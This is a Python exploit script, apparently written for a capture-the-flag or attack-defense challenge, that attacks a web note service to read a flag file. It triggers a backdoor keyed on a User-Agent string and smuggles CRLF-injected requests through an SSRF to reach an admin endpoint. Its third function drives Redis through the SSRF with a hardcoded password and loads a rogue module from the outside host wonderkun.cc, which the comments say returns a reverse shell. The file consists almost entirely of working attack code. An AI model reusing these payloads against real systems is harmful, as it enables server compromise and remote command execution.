#!/usr/bin/python
#coding:utf-8

import requests
import hashlib
import string
import random


def md5sum(s):
    MD5 = hashlib.md5()
    MD5.update(s.encode('utf-8'))
    return MD5.hexdigest()
    
def exp1(host):
    '''
        /info  backdoor verify
    '''
    url = "http://{}/info?file=/flag".format(host)
    userAgent = "Mozilla/5.0 (Macintosh; wdeYKQtOhc6L8TsIm1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36"
    header = {"User-Agent":userAgent}
    res = requests.get(url,headers=header)
    if res.status_code == 200 and "flag" in res.text:
        print("[*] backdoor verify ok!")
        print(res.text)
    else:
        print("[-] backdoor fixed!")

def exp2(host):

    '''
        /urlnote 
    '''
    url = "http://{}/urlnote".format(host)

    session = requests.Session()
    header = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    randBase = string.ascii_letters+string.digits
    randStr = "".join(random.sample(randBase,16))

    randStrMd5 = md5sum(randStr)

    payload = "title=test&url=http://127.0.0.1:8080/test2?a=1%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aConnection:%20keep-alive%0d%0aContent-Length:%200%0d%0a%0d%0aPOST%20/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aIdentify-Client:%20{}%0d%0a%0d%0a".format(randStr)

    res = session.post(url,data=payload,headers=header)

    if res.status_code != 200 :
        print("[*] ssrf backdoor get flag error!")
        return 
    
    index = "http://{}/".format(host)
    res = session.get(index)

    if res.status_code != 200 :
        print("[*] ssrf backdoor get flag error!")
        return 

    flagUrl = "http://{}/static/{}".format(host,randStrMd5)
    
    res = session.get(flagUrl)
    if res.status_code == 200 and "flag" in res.text:
        print("[*] ssrf backdoor verify success!")
        print(res.text)
    else:
        print("[*] ssrf backdoor get flag error!")


def exp3(host):
    '''
       /urlnote  
       ssrf connect redis to getshell 
    '''

    url = "http://{}/urlnote".format(host)

    session = requests.Session()

    header = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # send payload ， set redis to slave 
    payload = "title=payload1&url=http://172.16.0.3:6379/?a=1%0d%0a*2%0d%0a$4%0d%0aauth%0d%0a$13%0d%0aredis123456aB%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$6%0d%0aexp.so%0d%0a*3%0d%0a$7%0d%0aSLAVEOF%0d%0a$12%0d%0awonderkun.cc%0d%0a$5%0d%0a21000%0d%0a"

    res = session.post(url,data=payload,headers=header)

    if res.status_code != 200 :
        print("[*] ssrf connect redis error!")
        return 

    # send payload , set timeout 
    payload = "title=payload2&url=http://192.168.0.100:7777/?a=test" # add a host ，without route to it

    res = session.post(url,data=payload,headers=header)

    if res.status_code != 200 :
        print("[*] ssrf connect redis error!")
        return 

    # send paylaod , let redis reverse shell to wonderkun.cc:7777 

    payload = "title=payload3&url=http://172.16.0.3:6379/?a=1%0d%0a*2%0d%0a$4%0d%0aauth%0d%0a$13%0d%0aredis123456aB%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$7%0d%0aSLAVEOF%0d%0a$2%0d%0aNO%0d%0a$3%0d%0aONE%0d%0a*2%0d%0a$11%0d%0asystem.exec%0d%0a$2%0d%0als%0d%0a"

    res = session.post(url,data=payload,headers=header)

    if res.status_code != 200 :
        print("[*] ssrf connect redis error!")
        return 
    
    url = "http://{}/".format(host)

    res = session.get(url)

    # nc -l -p 7777 , return shell to wonderkun.cc:7777 

    '''
    run 
    > redis-cli 
       > auth key
       > set key '{"notes":[{"Type":"adminnote","Data":{"version":"172.18.2:6379","who":"wonderkun","memory":"cat /flag"}}]}'
    
    visit /
    '''

HOST = "192.168.15.166"

if __name__ == "__main__":

    exp1(HOST)
    exp2(HOST)
    exp3(HOST)
